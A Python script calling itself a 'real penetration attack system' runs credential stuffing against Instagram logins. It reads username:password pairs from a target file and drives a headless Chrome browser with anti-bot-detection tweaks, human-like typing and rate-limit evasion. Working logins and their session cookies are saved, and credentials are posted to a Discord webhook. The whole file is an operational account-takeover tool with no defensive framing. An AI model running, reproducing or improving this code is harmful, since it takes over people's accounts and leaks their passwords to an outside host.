#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
💀 REAL PENETRATION ATTACK SYSTEM 💀
SugarGlitch - Direct Instagram Login Brute Force - FIXED VERSION
"""

import time
import random
import json
import requests
import tempfile
import os
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium.webdriver.common.action_chains import ActionChains
import re
from datetime import datetime

class RealPenetrationAttack:
    def __init__(self):
        self.driver = None
        self.session = requests.Session()
        self.csrf_token = None
        self.session_id = None
        self.successful_attacks = []
        
    def setup_chrome(self):
        """🔧 Fixed Chrome setup"""
        print("🔧 Setting up Chrome driver...")
        
        try:
            options = Options()
            
            # Create unique user data directory with timestamp
            timestamp = str(int(time.time() * 1000))
            user_data_dir = f"/tmp/chrome_attack_{timestamp}_{random.randint(1000,9999)}"
            os.makedirs(user_data_dir, exist_ok=True)
            
            # Essential Chrome arguments
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--disable-extensions")
            options.add_argument("--disable-gpu")
            options.add_argument("--headless")
            options.add_argument(f"--user-data-dir={user_data_dir}")
            options.add_argument("--disable-blink-features=AutomationControlled")
            options.add_argument("--window-size=1920,1080")
            options.add_argument("--disable-automation")
            options.add_argument("--disable-web-security")
            options.add_argument("--allow-running-insecure-content")
            
            # Anti-detection
            options.add_experimental_option("useAutomationExtension", False)
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            
            self.driver = webdriver.Chrome(options=options)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            print("✅ Chrome driver ready!")
            return True
            
        except Exception as e:
            print(f"❌ Chrome setup failed: {e}")
            return False
    
    def extract_csrf_token(self):
        """Extract CSRF token from Instagram"""
        try:
            # Multiple methods to find CSRF token
            csrf_selectors = [
                'input[name="csrfmiddlewaretoken"]',
                'meta[name="csrf-token"]',
                '[name="csrfmiddlewaretoken"]',
                'input[type="hidden"][name="csrfmiddlewaretoken"]'
            ]
            
            for selector in csrf_selectors:
                try:
                    csrf_element = self.driver.find_element(By.CSS_SELECTOR, selector)
                    csrf_token = csrf_element.get_attribute('value') or csrf_element.get_attribute('content')
                    if csrf_token:
                        self.csrf_token = csrf_token
                        print(f"✅ CSRF token extracted: {csrf_token[:20]}...")
                        return csrf_token
                except:
                    continue
            
            # Try extracting from page source
            page_source = self.driver.page_source
            csrf_match = re.search(r'"csrf_token":"([^"]+)"', page_source)
            if csrf_match:
                self.csrf_token = csrf_match.group(1)
                print(f"✅ CSRF token from source: {self.csrf_token[:20]}...")
                return self.csrf_token
                
            print("⚠️ CSRF token not found, proceeding without it")
            return None
            
        except Exception as e:
            print(f"❌ CSRF extraction failed: {e}")
            return None
    
    def human_typing(self, element, text):
        """Simulate human typing"""
        element.clear()
        for char in text:
            element.send_keys(char)
            time.sleep(random.uniform(0.05, 0.15))
    
    def attempt_login(self, username, password):
        """Attempt Instagram login"""
        try:
            print(f"🎯 Attempting login: {username}:{password}")
            
            # Go to Instagram login
            self.driver.get("https://www.instagram.com/accounts/login/")
            time.sleep(random.uniform(3, 5))
            
            # Extract CSRF token
            self.extract_csrf_token()
            
            # Find login form elements with multiple selectors
            username_selectors = [
                'input[name="username"]',
                'input[aria-label="Phone number, username, or email"]',
                'input[placeholder*="username"]',
                'input[type="text"]'
            ]
            
            password_selectors = [
                'input[name="password"]',
                'input[aria-label="Password"]',
                'input[type="password"]'
            ]
            
            username_field = None
            password_field = None
            
            # Find username field
            for selector in username_selectors:
                try:
                    username_field = WebDriverWait(self.driver, 5).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                    )
                    break
                except:
                    continue
            
            # Find password field
            for selector in password_selectors:
                try:
                    password_field = self.driver.find_element(By.CSS_SELECTOR, selector)
                    break
                except:
                    continue
            
            if not username_field or not password_field:
                print("❌ Login form not found")
                return False
            
            # Type credentials with human-like behavior
            self.human_typing(username_field, username)
            time.sleep(random.uniform(0.5, 1.0))
            self.human_typing(password_field, password)
            time.sleep(random.uniform(1, 2))
            
            # Find and click login button
            login_selectors = [
                'button[type="submit"]',
                'button:contains("Log in")',
                'div[role="button"]:contains("Log in")',
                'button:contains("Log In")'
            ]
            
            for selector in login_selectors:
                try:
                    if ':contains(' in selector:
                        login_button = self.driver.find_element(By.XPATH, f"//button[contains(text(), 'Log in')] | //button[contains(text(), 'Log In')]")
                    else:
                        login_button = self.driver.find_element(By.CSS_SELECTOR, selector)
                    
                    # Human-like click
                    ActionChains(self.driver).move_to_element(login_button).pause(0.5).click().perform()
                    break
                except:
                    continue
            
            # Wait for response
            time.sleep(random.uniform(5, 8))
            
            # Check for success indicators
            current_url = self.driver.current_url
            page_source = self.driver.page_source.lower()
            
            success_indicators = [
                '/accounts/onetap/' in current_url,
                'instagram.com/' == current_url.replace('https://www.', ''),
                'your story' in page_source,
                'home' in page_source and 'feed' in page_source,
                'direct' in page_source and 'messages' in page_source
            ]
            
            if any(success_indicators):
                print(f"🔥 SUCCESS! Login successful: {username}:{password}")
                
                # Extract session data
                cookies = self.driver.get_cookies()
                session_data = {
                    'username': username,
                    'password': password,
                    'cookies': cookies,
                    'success_time': datetime.now().isoformat(),
                    'url': current_url
                }
                
                # Save successful login
                with open('successful_logins.json', 'a') as f:
                    f.write(json.dumps(session_data) + '\\n')
                
                self.successful_attacks.append(session_data)
                
                # Alert Discord if configured
                try:
                    with open('discord_webhook.txt', 'r') as f:
                        webhook_url = f.read().strip()
                        requests.post(webhook_url, json={
                            'content': f'🔥 INSTAGRAM PENETRATION SUCCESS!\\nUsername: {username}\\nPassword: {password}\\nTime: {datetime.now()}'
                        })
                except:
                    pass
                
                return True
            
            # Check for specific error indicators
            error_indicators = [
                'sorry, your password was incorrect' in page_source,
                'incorrect password' in page_source,
                'user not found' in page_source,
                'please wait a few minutes' in page_source,
                'rate limit' in page_source
            ]
            
            if any(error_indicators):
                if 'wait' in page_source or 'rate limit' in page_source:
                    print("⚠️ Rate limited - waiting longer...")
                    time.sleep(random.uniform(30, 60))
                else:
                    print(f"❌ Login failed: {username}:{password}")
            
            return False
            
        except Exception as e:
            print(f"❌ Login attempt failed: {e}")
            return False
    
    def run_attack(self, target_file="high_probability_targets.txt"):
        """Execute the penetration attack"""
        print("💀 STARTING REAL PENETRATION ATTACK")
        print("=" * 50)
        
        if not self.setup_chrome():
            return False
        
        try:
            # Load targets
            if not os.path.exists(target_file):
                print(f"❌ Target file not found: {target_file}")
                return False
            
            with open(target_file, 'r') as f:
                targets = [line.strip() for line in f if line.strip() and ':' in line]
            
            print(f"🎯 Loaded {len(targets)} targets")
            
            success_count = 0
            
            for i, target in enumerate(targets, 1):
                try:
                    username, password = target.split(':', 1)
                    print(f"\\n[{i}/{len(targets)}] Testing: {username}")
                    
                    if self.attempt_login(username, password):
                        success_count += 1
                        print(f"🔥 SUCCESS COUNT: {success_count}")
                    
                    # Anti-detection delay
                    delay = random.uniform(8, 20)
                    print(f"⏳ Waiting {delay:.1f}s before next attempt...")
                    time.sleep(delay)
                    
                except Exception as e:
                    print(f"❌ Error processing target {target}: {e}")
                    continue
            
            print(f"\\n💀 ATTACK COMPLETE!")
            print(f"🔥 Successful logins: {success_count}")
            print(f"📊 Success rate: {(success_count/len(targets)*100):.1f}%")
            
            return True
            
        except Exception as e:
            print(f"❌ Attack failed: {e}")
            return False
        
        finally:
            if self.driver:
                self.driver.quit()

def main():
    print("💀" * 25)
    print("💀 REAL PENETRATION ATTACK SYSTEM 💀")
    print("💀 SugarGlitch - Fixed Version     💀")
    print("💀" * 25)
    
    # Create attack log
    with open('attack_log.txt', 'a') as f:
        f.write(f"\\n{datetime.now()} - Real penetration attack started\\n")
    
    attacker = RealPenetrationAttack()
    attacker.run_attack()

if __name__ == "__main__":
    main()
